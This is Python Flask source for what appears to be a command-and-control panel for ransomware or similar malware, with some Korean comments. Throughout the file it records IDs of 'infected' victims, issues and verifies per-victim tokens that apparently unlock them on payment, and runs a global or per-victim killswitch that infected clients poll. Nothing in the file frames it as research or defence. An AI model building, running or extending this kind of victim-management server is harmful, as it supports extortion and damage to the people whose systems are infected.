from flask import Flask, render_template, request, jsonify
import os
import json
import uuid

app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TOKENS_PATH = os.path.join(BASE_DIR, "token_store.json")
INFECTED_PATH = os.path.join(BASE_DIR, "infected_ids.json")
KILLSWITCH_PATH = os.path.join(BASE_DIR, "killswitch.json")

tokens = {}

def load_tokens():
    global tokens
    if os.path.exists(TOKENS_PATH):
        with open(TOKENS_PATH, "r", encoding="utf-8") as f:
            try:
                tokens = json.load(f)
            except json.JSONDecodeError:
                tokens = {}
    else:
        tokens = {}

def save_tokens():
    with open(TOKENS_PATH, "w", encoding="utf-8") as f:
        json.dump(tokens, f, indent=4)

load_tokens()

def save_infected_id(id_str):
    os.makedirs(os.path.dirname(INFECTED_PATH) or ".", exist_ok=True)
    id_str = id_str.strip()
    if not os.path.exists(INFECTED_PATH):
        with open(INFECTED_PATH, "w", encoding="utf-8") as f:
            json.dump([], f)
    with open(INFECTED_PATH, "r+", encoding="utf-8") as f:
        try:
            ids = set(json.load(f))
        except json.JSONDecodeError:
            ids = set()
        ids.add(id_str)
        f.seek(0)
        json.dump(list(ids), f, indent=4)
        f.truncate()

def remove_infected_id(id_str):
    id_str = id_str.strip()
    if not os.path.exists(INFECTED_PATH):
        return
    with open(INFECTED_PATH, "r+", encoding="utf-8") as f:
        try:
            ids = set(json.load(f))
        except json.JSONDecodeError:
            ids = set()
        ids.discard(id_str)
        f.seek(0)
        json.dump(list(ids), f, indent=4)
        f.truncate()

@app.route("/", methods=["GET", "POST"])
def home():
    return render_template("dashboard.html")

@app.route("/api/register_id", methods=["POST"])
def register_id():
    data = request.get_json()
    id_str = data.get("id")
    if not id_str:
        return jsonify({"error": "No ID provided"}), 400
    save_infected_id(id_str)
    return jsonify({"status": "registered"})

@app.route("/api/infected_ids")
def get_infected_ids():
    if os.path.exists(INFECTED_PATH):
        with open(INFECTED_PATH, "r", encoding="utf-8") as f:
            try:
                ids = json.load(f)
            except json.JSONDecodeError:
                ids = []
    else:
        ids = []
    return jsonify(ids)

@app.route("/api/generate_token", methods=["POST"])
def generate_token():
    data = request.get_json()
    id_str = data.get("id")
    if not id_str:
        return jsonify({"error": "ID not provided"}), 400
    id_str = id_str.strip()
    existing_token = None
    for t, i in tokens.items():
        if i == id_str:
            existing_token = t
            break
    if existing_token:
        del tokens[existing_token]
    new_token = str(uuid.uuid4()).replace("-", "")[:16]
    tokens[new_token] = id_str
    save_tokens()
    return jsonify({"token": new_token})

@app.route("/api/verify", methods=["POST"])
def verify_token():
    global tokens
    data = request.get_json()
    token = data.get("token")
    infection_id = data.get("id")
    if not token or not infection_id:
        return jsonify({"error": "토큰 또는 ID 누락"}), 400
    token = token.strip()
    infection_id = infection_id.strip()
    load_tokens()
    if token not in tokens or tokens[token] != infection_id:
        return jsonify({"error": "잘못된 토큰 또는 ID"}), 403
    # 인증 성공
    del tokens[token]
    save_tokens()
    # 감염자 ID 삭제
    if os.path.exists(INFECTED_PATH):
        with open(INFECTED_PATH, "r", encoding="utf-8") as f:
            try:
                infected_ids = json.load(f)
            except json.JSONDecodeError:
                infected_ids = []
        if infection_id in infected_ids:
            infected_ids.remove(infection_id)
            with open(INFECTED_PATH, "w", encoding="utf-8") as f:
                json.dump(infected_ids, f, indent=4)
    return jsonify({"status": "verified"})

@app.route("/api/tokens")
def get_tokens():
    load_tokens()
    return jsonify(tokens)

@app.route("/api/delete_token", methods=["POST"])
def delete_token():
    data = request.get_json()
    token = data.get("token")
    load_tokens()
    if token in tokens:
        del tokens[token]
        save_tokens()
        return jsonify({"status": "deleted"})
    else:
        return jsonify({"error": "Token not found"}), 404


def load_killswitch():
    if os.path.exists(KILLSWITCH_PATH):
        with open(KILLSWITCH_PATH, "r", encoding="utf-8") as f:
            try:
                state = json.load(f)
                # {"global": False, "victims": ["id1", ...]}
                if "victims" not in state:
                    state["victims"] = []
                if "global" not in state:
                    state["global"] = False
                return state
            except Exception:
                return {"global": False, "victims": []}
    return {"global": False, "victims": []}

def save_killswitch(state):
    with open(KILLSWITCH_PATH, "w", encoding="utf-8") as f:
        json.dump(state, f, indent=2)

@app.route("/api/killswitch", methods=["GET", "POST"])
def api_killswitch():
    state = load_killswitch()
    if request.method == "GET":
        victim_id = request.args.get("id", None)
        if victim_id:
            victims = set(state.get("victims", []))
            kill = state.get("global", False) or (victim_id in victims)
            # ✔️ 일회용: 사용 후 자동 삭제
            if victim_id in victims and kill:
                victims.discard(victim_id)
                state["victims"] = list(victims)
                save_killswitch(state)
            return jsonify({"kill": kill})
        else:
            return jsonify({"kill": state.get("global", False)})
    elif request.method == "POST":
        data = request.get_json()
        is_kill = bool(data.get("kill", False))
        victim_id = data.get("id", None)
        if victim_id:
            victims = set(state.get("victims", []))
            if is_kill:
                victims.add(victim_id)
            else:
                victims.discard(victim_id)
            state["victims"] = list(victims)
        else:
            state["global"] = is_kill
        save_killswitch(state)
        return jsonify({"kill": is_kill})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80, debug=True)
